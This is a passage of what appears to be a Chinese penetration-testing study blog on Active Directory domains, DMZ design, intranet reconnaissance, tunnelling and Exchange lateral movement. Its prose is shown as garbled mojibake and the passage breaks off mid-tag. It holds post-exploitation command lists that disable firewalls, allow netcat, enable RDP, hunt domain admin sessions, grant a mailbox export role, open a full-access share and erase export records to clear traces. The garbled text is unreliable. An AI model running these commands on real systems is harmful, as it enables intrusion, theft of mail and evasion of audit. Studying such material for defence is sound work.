·çš„ï¼Œæˆ‘ä»¬æŠŠå­˜æ”¾æœ‰æ´»åŠ¨ç›®å½•æ•°æ®åº“çš„è®¡ç®—æœºå°±ç§°ä¸ºDcã€‚æ‰€ä»¥è¯´æˆ‘ä»¬è¦å®ç°åŸŸç¯å¢ƒï¼Œå…¶å®å°±æ˜¯è¦å®‰è£…ADï¼Œå½“å†…ç½‘ä¸­çš„ä¸€å°è®¡ç®—æœºå®‰è£…äº†ADåï¼Œå®ƒå°±å˜æˆäº†DCã€‚</p><p><strong>å®‰å…¨åŸŸçš„åˆ’åˆ†</strong></p><p>å®‰å…¨åŸŸåˆ’åˆ†çš„ç›®çš„æ˜¯å°†ä¸€ç»„å®‰å…¨ç­‰çº§ç›¸åŒçš„è®¡ç®—æœºåˆ’å…¥åŒä¸€ä¸ªç½‘æ®µå†…ï¼Œè¿™ä¸€ç½‘æ®µå†…çš„è®¡ç®—æœºæ‹¥æœ‰ç›¸åŒçš„ç½‘ç»œè¾¹ç•Œï¼Œåœ¨ç½‘ç»œè¾¹ç•Œä¸Šé‡‡ç”¨é˜²ç«å¢™éƒ¨ç½²æ¥å®ç°å¯¹å…¶ä»–å®‰å…¨åŸŸçš„NACL(ç½‘ç»œè®¿é—®æ§åˆ¶ç­–ç•¥ï¼‰ï¼Œå…è®¸å“ªäº›IPè®¿é—®æ­¤åŸŸã€ä¸å…è®¸å“ªäº›è®¿é—®æ­¤åŸŸ;å…è®¸æ­¤åŸŸè®¿é—®å“ªäº›IP/ç½‘æ®µã€ä¸å…è®¸è®¿é—®å“ªäº›IP/ç½‘æ®µã€‚ä½¿å¾—å…¶é£é™©æœ€å°åŒ–ï¼Œå½“å‘ç”Ÿæ”»å‡»æ—¶å¯ä»¥å°†å¨èƒæœ€å¤§åŒ–çš„éš”ç¦»ï¼Œå‡å°‘å¯¹åŸŸå†…è®¡ç®—æœºçš„å½±å“ã€‚</p><p><strong>DMZ</strong></p><p>DMZç§°ä¸ºâ€œéš”ç¦»åŒºâ€ï¼Œä¹Ÿç§°â€œéå†›äº‹åŒ–åŒºâ€ã€‚æ˜¯ä¸ºäº†è§£å†³å®‰è£…é˜²ç«å¢™åå¤–éƒ¨ç½‘ç»œä¸èƒ½è®¿é—®å†…éƒ¨ç½‘ç»œæœåŠ¡å™¨çš„é—®é¢˜ï¼Œè€Œè®¾ç«‹çš„ä¸€ä¸ªéå®‰å…¨ç³»ç»Ÿä¸å®‰å…¨ç³»ç»Ÿä¹‹é—´çš„ç¼“å†²åŒºã€‚<br>è¿™ä¸ªç¼“å†²åŒºä½äºä¼ä¸šå†…éƒ¨ç½‘ç»œå’Œå¤–éƒ¨ç½‘ç»œä¹‹é—´çš„å°ç½‘ç»œåŒºåŸŸå†…ï¼Œåœ¨è¿™ä¸ªå°ç½‘ç»œåŒºåŸŸå†…å¯ä»¥æ”¾ç½®ä¸€äº›å¿…é¡»å…¬å¼€çš„æœåŠ¡å™¨è®¾æ–½ï¼Œå¦‚ä¼ä¸šWebæœåŠ¡å™¨ã€FTPæœåŠ¡å™¨å’Œè®ºå›ç­‰ã€‚<br>å¦ä¸€æ–¹é¢ï¼Œé€šè¿‡è¿™æ ·ä¸€ä¸ªDMzåŒºåŸŸï¼Œæ›´åŠ æœ‰æ•ˆåœ°ä¿æŠ¤äº†å†…éƒ¨ç½‘ç»œï¼Œå› ä¸ºè¿™ç§ç½‘ç»œéƒ¨ç½²ï¼Œæ¯”èµ·ä¸€èˆ¬çš„é˜²ç«å¢™æ–¹æ¡ˆï¼Œå¯¹æ”»å‡»è€…æ¥è¯´åˆå¤šäº†ä¸€é“å…³å¡ã€‚</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628103312842.png" alt="image-20220628103312842"></p><p><strong>DMZå±éšœåŠŸèƒ½</strong></p><p>(1) å†…ç½‘å¯ä»¥è®¿é—®å¤–ç½‘<br>å†…ç½‘çš„è§’æˆ·éœ€è¦è‡ªç”±åœ°è®¿é—®å¤–ç½‘ã€‚åœ¨è¿™ä¸€ç­–ç•¥ä¸­ï¼Œé˜²ç«å¢™éœ€è¦æ‰§è¡ŒNATã€‚</p><p>(2) å†…ç½‘å¯ä»¥è®¿é—®DMZ<br>æ­¤ç­–ç•¥ä½¿å†…ç½‘ç”¨æˆ·å¯ä»¥ä½¿ç”¨æˆ–è€…ç®¡ç†DMZä¸­çš„æœåŠ¡å™¨ã€‚</p><p>(3) å¤–ç½‘ä¸èƒ½è®¿é—®å†…ç½‘<br>è¿™æ˜¯é˜²ç«å¢™çš„åŸºæœ¬ç­–ç•¥äº†ï¼Œå†…ç½‘ä¸­å­˜æ”¾çš„æ˜¯å…¬å¸å†…éƒ¨æ•°æ®ï¼Œæ˜¾ç„¶è¿™äº›æ•°æ®æ˜¯ä¸å…è®¸å¤–ç½‘çš„ç”¨æˆ·è¿›è¡Œè®¿é—®çš„ã€‚å¦‚æœè€è®¿é—®ï¼Œå°±è¦é€šè¿‡VPNæ–¹å¼æ¥è¿›è¡Œã€‚</p><p>(4) å¤–ç½‘å¯ä»¥è®¿é—®DMZ<br>DMZä¸­çš„æœåŠ¡å™¨éœ€è¦ä¸ºå¤–ç•Œæä¾›æœåŠ¡ï¼Œæ‰€ä»¥å¤–ç½‘å¿…é¡»å¯ä»¥è®¿é—®DMZã€‚åŒæ—¶ï¼Œå¤–ç½‘è®¿é—®DMZéœ€è¦ç”±é˜²ç«å¢™å®Œæˆå¯¹å¤–åœ°å€åˆ°æœåŠ¡å™¨å®é™…åœ°å€çš„è½¬æ¢ã€‚</p><p>(5) DMZä¸èƒ½è®¿é—®å†…ç½‘<br>å¦‚ä¸æ‰§è¡Œæ­¤ç­–ç•¥ï¼Œåˆ™å½“å…¥ä¾µè€…æ”»é™·DMZæ—¶ï¼Œå†…éƒ¨ç½‘ç»œå°†ä¸ä¼šå—ä¿æŠ¤ã€‚</p><p>(6ï¼‰DMZä¸èƒ½è®¿é—®å¤–ç½‘<br>æ­¤æ¡ç­–ç•¥ä¹Ÿæœ‰ä¾‹å¤–ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œåœ¨DMZä¸­æ”¾ç½®é‚®ä»¶æœåŠ¡å™¨æ—¶ï¼Œå°±éœ€è¦è®¿é—®å¤–ç½‘ï¼Œå¦åˆ™å°†ä¸èƒ½æ­£å¸¸å·¥ä½œã€‚</p><p><strong>åŸŸä¸­è®¡ç®—æœºåˆ†ç±»</strong></p><p>åŸŸæ§åˆ¶å™¨-æˆå‘˜æœåŠ¡å™¨-å®¢æˆ·æœº-ç‹¬ç«‹æœåŠ¡å™¨</p><p>åŸŸæ§åˆ¶å™¨æ˜¯å­˜æ”¾æ´»åŠ¨ç›®å½•æ•°æ®åº“çš„ï¼Œæ˜¯åŸŸä¸­å¿…é¡»è¦æœ‰çš„ï¼Œè€Œå…¶ä»–ä¸‰ç§åˆ™ä¸æ˜¯å¿…é¡»çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€ç®€å•çš„åŸŸå¯ä»¥åªåŒ…å«ä¸€å°è®¡ç®—æœºï¼Œè¿™å°è®¡ç®—æœºå°±æ˜¯è¯¥åŸŸçš„åŸŸæ§åˆ¶å™¨ã€‚<br>åŸŸä¸­å„ä¸ªæœåŠ¡å™¨çš„è§’è‰²ä¹Ÿæ˜¯å¯ä»¥æ”¹å˜çš„ï¼Œä¾‹å¦‚åŸŸæœåŠ¡å™¨åœ¨åˆ é™¤æ´»åŠ¨ç›®å½•æ—¶ï¼Œå¦‚æœæ˜¯åŸŸä¸­æœ€åä¸€ä¸ªåŸŸæ§åˆ¶å™¨ï¼Œåˆ™è¯¥åŸŸæœåŠ¡å™¨ä¼šæˆä¸ºç‹¬ç«‹æœåŠ¡å™¨ï¼Œå¦‚æœä¸æ˜¯åŸŸä¸­å”¯ä¸€çš„åŸŸæ§åˆ¶å™¨ï¼Œåˆ™å°†ä½¿è¯¥æœåŠ¡å™¨æˆä¸ºæˆå‘˜æœåŠ¡å™¨ã€‚åŒæ—¶ç‹¬ç«‹æœåŠ¡å™¨æ—¢å¯ä»¥è½¬æ¢ä¸ºåŸŸæ§åˆ¶å™¨ï¼Œä¹Ÿå¯ä»¥åŠ å…¥åˆ°æŸä¸ªåŸŸæˆä¸ºæˆå‘˜æœåŠ¡å™¨ã€‚</p><p><strong>å†…æƒé™è§£è¯»:</strong></p><p><strong>åŸŸæœ¬åœ°ç»„</strong>ï¼Œå¤šåŸŸç”¨æˆ·è®¿é—®å•åŸŸèµ„æºï¼ˆè®¿é—®åŒä¸€ä¸ªåŸŸ)ã€‚å¯ä»¥ä»ä»»ä½•åŸŸæ·»åŠ ç”¨æˆ·è´¦æˆ·ã€é€šç”¨ç»„å’Œå…¨å±€ç»„ï¼Œåªèƒ½åœ¨å…¶æ‰€åœ¨åŸŸå†…æŒ‡æ´¾æƒé™ã€‚åŸŸæœ¬åœ°ç»„ä¸èƒ½åµŒå¥—äºå…¶ä»–ç»„ä¸­ã€‚å®ƒä¸»è¦æ˜¯ç”¨äºæˆäºˆä½äºæœ¬åŸŸèµ„æºçš„è®¿é—®æƒé™</p><p><strong>å…¨å±€ç»„</strong>ï¼Œå•åŸŸç”¨æˆ·è®¿é—®å¤šåŸŸèµ„æºï¼ˆå¿…é¡»æ˜¯åŒä¸€ä¸ªåŸŸé‡Œé¢çš„ç”¨æˆ·ï¼‰ã€‚åªèƒ½åœ¨åˆ›å»ºè¯¥å…¨å±€ç»„çš„åŸŸä¸Šè¿›è¡Œæ·»åŠ ç”¨æˆ·å’Œå…¨å±€ç»„ï¼Œå¯ä»¥åœ¨åŸŸæ—ä¸­çš„ä»»ä½•åŸŸä¸­æŒ‡æ´¾æƒé™ï¼Œå…¨å±€ç»„å¯ä»¥åµŒå¥—åœ¨å…¶ä»–ç»„ä¸­ã€‚</p><p><strong>é€šç”¨ç»„</strong>ï¼Œé€šç”¨ç»„æˆå‘˜æ¥è‡ªåŸŸæ—ä¸­ä»»ä½•åŸŸä¸­çš„ç”¨æˆ·è´¦æˆ·ã€å…¨å±€ç»„å’Œå…¶ä»–çš„é€šç”¨ç»„ï¼Œå¯ä»¥åœ¨è¯¥åŸŸæ—ä¸­çš„ä»»ä½•åŸŸä¸­æŒ‡æ´¾æƒé™ï¼Œå¯ä»¥åµŒå¥—äºå…¶ä»–åŸŸç»„ä¸­ã€‚éå¸¸é€‚äºåŸŸæ—ä¸­çš„è·¨åŸŸè®¿é—®ã€‚</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628104718578.png" alt="image-20220628104718578"></p><p><strong>A-G-DL-Pç­–ç•¥</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628154433781.png" alt="image-20220628154433781"></p><p><strong>æœ¬åœ°åŸŸç»„çš„æƒé™</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628155157050.png" alt="image-20220628155157050"></p><p><strong>å…¨å±€ç»„ã€é€šç”¨ç»„çš„æƒé™</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628155303297.png" alt="image-20220628155303297"></p><h2 id="å†…ç½‘ä¿¡æ¯æœé›†"><a href="#å†…ç½‘ä¿¡æ¯æœé›†" class="headerlink" title="å†…ç½‘ä¿¡æ¯æœé›†"></a>å†…ç½‘ä¿¡æ¯æœé›†</h2><p><strong>å·¥ä½œç»„ä¿¡æ¯æœé›†</strong></p><p><strong>æœ¬æœºä¿¡æ¯æ”¶é›†</strong></p><p>æŸ¥è¯¢ç½‘ç»œé…ç½®</p><pre><code>ipconfig /all</code></pre><p>æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨</p><pre><code>net usernet localgroup administratorsquery user ||qwinsta æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·</code></pre><p>æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨</p><pre><code>tasklist /vwmic process list brief</code></pre><p>æŸ¥è¯¢æ“ä½œç³»ç»ŸåŠå®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯</p><pre><code>è·å–æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯systeminfoæŸ¥çœ‹å®‰è£…è½¯ä»¶ä»¥åŠç‰ˆæœ¬è·¯å¾„wmic product name,versionpowershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code></pre><p>æŸ¥è¯¢ç«¯å£åˆ—è¡¨</p><pre><code>netstat -ano</code></pre><p>æŸ¥è¯¢è¡¥ä¸åˆ—è¡¨</p><pre><code>systeminfoWmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre><p>æŸ¥è¯¢æœ¬æœºå…±äº«</p><pre><code>net sharewmic share get name,path,status</code></pre><p>æŸ¥è¯¢é˜²ç«å¢™é…ç½®</p><pre><code>æŸ¥çœ‹é˜²ç«å¢™é…ç½®:netsh firewall show configå…³é—­é˜²ç«å¢™:Windows server 2003ç³»ç»ŸåŠå…¶ä»¥å‰ï¼šnetsh firewall set opmode disableWindows server 2003ä»¥åç³»ç»Ÿç‰ˆæœ¬ï¼šnetsh advfirewall set allprofiles state offä¿®æ”¹é˜²ç«å¢™é…ç½®windows server 2003ç³»ç»ŸåŠä¹‹å‰ç‰ˆæœ¬ï¼Œå…è®¸æŒ‡å®šç¨‹åºå…¨éƒ¨è¿æ¥:netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enablewindows server 2003ä¹‹åç³»ç»Ÿç‰ˆæœ¬:å…è®¸æŒ‡å®šç¨‹åºæ¥å…¥netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;å…è®¸æŒ‡å®šç¨‹åºè¿å‡ºnetsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;å…è®¸3389ç«¯å£æ”¾è¡Œnetsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow </code></pre><p>æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡</p><pre><code>æŸ¥è¯¢è¿œç¨‹è¿æ¥ç«¯å£Reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot; /v portnumberwindows server 2008å’Œwindows server 2012å¼€å¯3389æ–¹æ³•(win7åªå¯ä»¥ç”¨å‰ä¸¤æ¡):wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1  wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1 reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /fwindows server 2003å’Œwindows xp:wmic path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1ä»¥ä¸Šå‰ææ¡ä»¶æ˜¯ç¡®ä¿Windows Management Instrumentationï¼ˆWinmgmtï¼‰æœåŠ¡å·²æ­£å¸¸å¯åŠ¨ï¼Œæƒé™çš„è¯éœ€è¦administratoråŠä»¥ä¸Š</code></pre><p>æŸ¥è¯¢å½“å‰æƒé™</p><pre><code>whoami whoami /all #è·å–åŸŸSIDnet user XXX /domain è·å–æŒ‡å®šè´¦æˆ·çš„è¯¦ç»†ä¿¡æ¯</code></pre><p>åˆ¤æ–­æ˜¯å¦æœ‰åŸŸ</p><pre><code>ipconfig /allsysteminfonet config workstationnet time /domain1.å­˜åœ¨åŸŸï¼Œå½“å‰ä¸æ˜¯åŸŸç”¨æˆ·2.å­˜åœ¨åŸŸï¼Œå½“å‰æ˜¯åŸŸç”¨æˆ·3.ä¸å­˜åœ¨åŸŸ</code></pre><p><strong>åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹</strong></p><p><strong>1.åˆ©ç”¨NetBIOSå¿«é€Ÿæ¢æµ‹å†…ç½‘</strong></p><p>å·¥å…·:Nbtscan</p><p>ä½¿ç”¨æ–¹æ³•:nbtscan.exe IP</p><p><strong>2.åˆ©ç”¨icmpæ¢æµ‹å†…ç½‘</strong></p><pre><code>for /L %l in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%l | findstr &quot;TTL=&quot;</code></pre><p><strong>3.åˆ©ç”¨arpæ‰«æå®Œæ•´æ¢æµ‹å†…ç½‘</strong></p><p>1.arp-scan</p><p>2.Invoke-ARPScan.ps1</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220630100231019.png" alt="image-20220630100231019"></p><p><strong>4.åˆ©ç”¨å¸¸è§„tcp/udpç«¯å£æ‰«ææ¢æµ‹å†…ç½‘</strong></p><p>å·¥å…·:scanline</p><pre><code>scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\sl_res.txt  -p 192.168.4.1-254 /b</code></pre><p><strong>åŸŸå†…ç«¯å£æ‰«æ</strong></p><p><strong>1.telnetæ¢æµ‹</strong></p><pre><code>telnet ip ç«¯å£</code></pre><p><strong>2.Sæ‰«æå™¨</strong></p><pre><code>S.exe TCP 192.168.1.1192.168.1.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111256 /Banner /save</code></pre><p><strong>åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†</strong></p><pre><code>net view /domainnet view /domain:XXXnet group /domainnet group &quot;domain computers&quot; /domainnet accounts /domainnltest /domain_trusts</code></pre><p><strong>åŸŸå†…æ§åˆ¶å™¨çš„æŸ¥æ‰¾</strong></p><pre><code>nltest /DCLIST:XXXNslookup -type=SRV _ldap._tcpnet time /domainnet group &quot;Domain Controllers&quot; /domainnetdom query pdc</code></pre><p><strong>åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜</strong></p><pre><code>æŸ¥è¯¢æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨net user /domainwmic useraccount get /alldsquery usernet localgroup administrators /domainæŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„net group &quot;domain admins&quot; /domainnet group &quot;Enterprise Admins&quot; /domain</code></pre><p><strong>æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹</strong></p><p><strong>1.æœ¬æœºæ£€æŸ¥</strong></p><ul><li>è·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨ A,B,C</li><li>æŸ¥çœ‹æœ¬æœºæ‰€æœ‰è¿›ç¨‹</li><li>äº¤å‰</li></ul><pre><code>1.è·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨net group &quot;Domain Admins&quot; /domain2.åˆ—å‡ºæœ¬æœºæ‰€æœ‰è¿›ç¨‹åŠè¿›ç¨‹ç”¨æˆ·tasklist /v3.å¯»æ‰¾æ˜¯å¦æœ‰è¿›ç¨‹æ‰€æœ‰è€…ä½åŸŸç®¡ç†å‘˜çš„è¿›ç¨‹</code></pre><p><strong>2.æŸ¥è¯¢åŸŸæ§åˆ¶å™¨çš„åŸŸç”¨æˆ·ä¼šè¯</strong></p><pre><code>1.æ”¶é›†åŸŸæ§åˆ¶å™¨çš„åˆ—è¡¨net group &quot;Domain Controllers&quot; /domain2.æ”¶é›†åŸŸç®¡ç†å‘˜çš„åˆ—è¡¨net group &quot;Domain Admins&quot; /domain3.ä½¿ç”¨Netsess.exeæŸ¥è¯¢æ¯ä¸ªåŸŸæ§åˆ¶å™¨æ”¶é›†æ‰€æœ‰æ´»åŠ¨åŸŸä¼šè¯çš„åˆ—è¡¨Netsess.exe -h4.å°†åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨äº¤å‰å¼•ç”¨ï¼Œä»¥ç¡®å®šå“ªäº›IPåœ°å€å…·æœ‰æ´»åŠ¨åŸŸä»¤ç‰Œã€‚</code></pre><p><strong>3.æ‰«æè¿œç¨‹ç³»ç»Ÿä¸Šè¿è¡Œçš„ä»»åŠ¡</strong></p><pre><code>1.æ”¶é›†åŸŸç®¡ç†å‘˜çš„åˆ—è¡¨net group &quot;Domain Admins&quot; /domain3.è¿è¡Œè„šæœ¬FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</code></pre><p><strong>4.æ‰«æè¿œç¨‹ç³»ç»Ÿä¸Šçš„NetBIOSä¿¡æ¯</strong></p><pre><code>for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</code></pre><p><strong>PowerShellæ”¶é›†åŸŸä¿¡æ¯</strong></p><p>PowerShellç‰ˆæœ¬</p><ul><li>2.0 win2008,win7</li><li>3.0 win2012,win8</li><li>4.0 win2012R2,win8.1</li><li>5.0 win2016,win10</li></ul><p>PowerShellç­–ç•¥</p><pre><code>Restricted #ä¸èƒ½æ‰§è¡Œä»»ä½•è„šæœ¬Allsigned #åªå…è®¸æ‰§è¡Œæ­£è§„ç­¾åçš„è„šæœ¬Unrestricted #æ‰§è¡Œä»»æ„è„šæœ¬RemoteSigned #æœ¬æœºæ‰§è¡Œè„šæœ¬ä¸å—é™åˆ¶ï¼Œæ‰§è¡Œè¿œç¨‹è„šæœ¬ï¼Œå¿…é¡»ç»è¿‡ç­¾å</code></pre><p>ä¿®æ”¹ç­–ç•¥</p><pre><code>Get-Executionpolicy  #æŸ¥çœ‹å½“å‰ç­–ç•¥Set-Executionpolicy Unrestricted # ä¿®æ”¹ç­–ç•¥</code></pre><p><strong>ä½¿ç”¨Powerviewè¿›è¡Œä¿¡æ¯æœé›†</strong></p><pre><code>-exec bypassImport-Module.\PowerView.ps1</code></pre><p>å¸¸ç”¨å‘½ä»¤:</p><pre><code>Import-Moduleä¸ºpowershellå¯¼å…¥è„šæœ¬å‘½ä»¤ï¼Œè¿™é‡Œå‡è®¾æˆ‘ä»¬ä¸‹è½½çš„powerview.ps1è„šæœ¬åœ¨C:\PowerView.ps1å‘½ä»¤æ ¼å¼ï¼špowershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; powerviewçš„å‘½ä»¤å‚æ•°&#125;&quot; å®šä½åŸŸç®¡ç†å‘˜powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; Invoke-UserHunter&#125;&quot; æ›´å¤šPowerViewå‘½ä»¤å‚æ•°Get-NetDomain: è·å–å½“å‰ç”¨æˆ·æ‰€åœ¨åŸŸçš„åç§°Get-NetUser: è·å–æ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯Get-NetDomainController: è·å–æ‰€æœ‰åŸŸæ§åˆ¶å™¨çš„ä¿¡æ¯Get-NetComputer: è·å–åŸŸå†…æ‰€æœ‰æœºå™¨çš„è¯¦ç»†ä¿¡æ¯Get-NetOU: è·å–åŸŸä¸­çš„OUä¿¡æ¯Get-NetGroup: è·å–æ‰€æœ‰åŸŸå†…ç»„å’Œç»„æˆå‘˜ä¿¡æ¯Get-NetFileServer: æ ¹æ®SPNè·å–å½“å‰åŸŸä½¿ç”¨çš„æ–‡ä»¶æœåŠ¡å™¨ä¿¡æ¯Get-NetShare: è·å–å½“å‰åŸŸå†…æ‰€æœ‰ç½‘ç»œå…±äº«ä¿¡æ¯Get-NetSession: è·å–æŒ‡å®šæœåŠ¡å™¨çš„ä¼šè¯Get-NetRDPSession: è·å–æŒ‡å®šæœåŠ¡å™¨çš„è¿œç¨‹è¿æ¥Get-NetProcess: è·å–è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹Get-UserEvent: è·å–æŒ‡å®šç”¨æˆ·çš„æ—¥å¿—Get-ADObiect: è·å–æ´»åŠ¨ç›®å½•çš„å¯¹è±¡Get-NetGPO: è·å–åŸŸå†…æ‰€æœ‰çš„ç»„ç­–ç•¥å¯¹è±¡Get-DomainPolicy: è·å–åŸŸé»˜è®¤ç­–ç•¥æˆ–åŸŸæ§åˆ¶å™¨ç­–ç•¥Invoke-UserHunter: è·å–åŸŸç”¨æˆ·ç™»å½•çš„è®¡ç®—æœºä¿¡æ¯åŠè¯¥ç”¨æˆ·æ˜¯å¦æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™Invoke-ProcessHunter: é€šè¿‡æŸ¥è¯¢åŸŸå†…æ‰€æœ‰çš„æœºå™¨è¿›ç¨‹æ‰¾åˆ°ç‰¹å®šç”¨æˆ·Invoke-UserEvenHunter: æ ¹æ®ç”¨æˆ·æ—¥å¿—æŸ¥è¯¢æŸåŸŸç”¨æˆ·ç™»å½•è¿‡å“ªäº›åŸŸæœºå™¨ã€‚</code></pre><h2 id="éšè—é€šä¿¡éš§é“æŠ€æœ¯"><a href="#éšè—é€šä¿¡éš§é“æŠ€æœ¯" class="headerlink" title="éšè—é€šä¿¡éš§é“æŠ€æœ¯"></a>éšè—é€šä¿¡éš§é“æŠ€æœ¯</h2><p>ç½‘ç»œå±‚éš§é“:</p><ul><li><p>IPv6éš§é“</p></li><li><p>ICMPéš§é“ (ping ip)</p></li></ul><p>ä¼ è¾“å±‚éš§é“:</p><ul><li>TCP (nc ip port)</li><li>UDP</li></ul><p>åº”ç”¨å±‚éš§é“:</p><ul><li>SSH</li><li>HTTP(curl ip:port)</li><li>DNS(nslookup <a href="http://www.baidu.com/">www.baidu.com</a> vps-ip)(dig @vps-ip <a href="http://www.baidu.com/">www.baidu.com</a>)</li></ul><p><strong>ICMPéš§é“</strong></p><p>ICMPéš§é“å·¥å…·æœ‰ï¼šPingTunnelã€icmptunnelã€icmpshã€powershellã€icmpç­‰</p><h2 id="æ¨ªå‘æ¸—é€"><a href="#æ¨ªå‘æ¸—é€" class="headerlink" title="æ¨ªå‘æ¸—é€"></a>æ¨ªå‘æ¸—é€</h2><p>exchangeé‚®ä»¶æœåŠ¡å™¨</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220701171227982.png" alt="image-20220701171227982"></p><p>å®¢æˆ·ç«¯/è¿œç¨‹è®¿é—®æ¥å£å’Œåè®®</p><ul><li>OWA</li><li>ECP</li><li>EWS</li></ul><p>åŸºäºç«¯å£æ‰«æå‘ç°:</p><ul><li>25ç«¯å£ SMTPçš„æŒ‡çº¹æ˜¾ç¤ºä¸ºExchange smtpd</li><li>80ç«¯å£ä¸º iis 8.5</li><li>443ç«¯å£</li></ul><p>SPNæŸ¥è¯¢</p><ul><li><pre><code>setspn -T pentest.com -F -Q */*</code></pre></li></ul><p><strong>ExchangeåŸºæœ¬æ“ä½œ</strong></p><p>æŸ¥çœ‹Mailboxæ•°æ®åº“</p><ul><li><pre><code>Get-MailboxDatabase -server &quot;Exchange1&quot;</code></pre></li><li><pre><code>add-pssnapin microsoft.exchange*</code></pre></li></ul><p>è·å–ç°æœ‰ç”¨æˆ·é‚®ä»¶åœ°å€</p><ul><li>æŸ¥çœ‹å…¨éƒ¨ç”¨æˆ·é‚®ç®±ä½¿ç”¨ä¿¡æ¯</li></ul><pre><code>Get-Mailbox | Format-Tables Name,WindowsEmailAddress</code></pre><ul><li>æŸ¥çœ‹æŒ‡å®šç”¨æˆ·é‚®ç®±ä½¿ç”¨ä¿¡æ¯</li></ul><pre><code>get-mailboxstatistics -identity administrator | Select DisplayName,ItemCount,TotalltemSize,LastLogonTime</code></pre><ul><li>æŸ¥çœ‹å…¨éƒ¨ç”¨æˆ·é‚®ç®±ä½¿ç”¨ä¿¡æ¯</li></ul><pre><code>Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalltemSize-Descend</code></pre><p><strong>æ·»åŠ æƒé™</strong></p><ul><li><p>æŸ¥çœ‹ç”¨æˆ·è§’è‰²æƒé™</p><pre><code>Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot; | Format-List RoleAssigneeName</code></pre></li><li><p>æ·»åŠ ç”¨æˆ·è§’è‰²æƒé™</p></li></ul><pre><code>New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;</code></pre><ul><li>åˆ é™¤ç”¨æˆ·è§’è‰²æƒé™</li></ul><pre><code>Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false</code></pre><p><strong>è®¾ç½®ç½‘ç»œå…±äº«æ–‡ä»¶å¤¹</strong></p><pre><code>net share inetpub=c:\inetpub /grant:everyone,full</code></pre><p><strong>æ¸…ç†ç—•è¿¹</strong></p><ul><li>æŸ¥çœ‹ä¹‹å‰äº§ç”Ÿçš„å¯¼å‡ºè¯·æ±‚è®°å½•</li></ul><pre><code>Get-MailboxExportRequest</code></pre><ul><li>åˆ é™¤å¯¼å‡ºè¯·æ±‚è®°å½•</li></ul><pre><code>Remove-MailboxExportRequest -Identity Administrator\mailboxexport</code></pre><h2 